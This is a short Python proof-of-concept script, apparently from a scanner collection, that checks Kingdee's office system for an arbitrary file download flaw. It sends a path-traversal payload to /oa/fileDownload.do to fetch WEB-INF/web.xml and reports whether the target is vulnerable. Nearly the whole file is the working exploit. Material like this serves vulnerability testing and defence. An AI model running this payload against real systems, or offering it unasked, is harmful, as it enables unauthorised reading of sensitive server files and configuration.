#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 金蝶办公系统任意文件下载
referer: http://www.wooyun.org/bugs/wooyun-2015-0150077
author: Lucifer
description: 金蝶协同办公系统/oa/fileDownload.do文件参数path未校验存在任意文件下载漏洞，导致泄露敏感信息
'''
import sys
import requests
import warnings
def run(url):
        result = ['金蝶办公系统任意文件下载','','']
        payload = "/oa/fileDownload.do?type=File&path=/../webapp/WEB-INF/web.xml"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)

            if req.headers["Content-Type"] == "application/xml":
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])

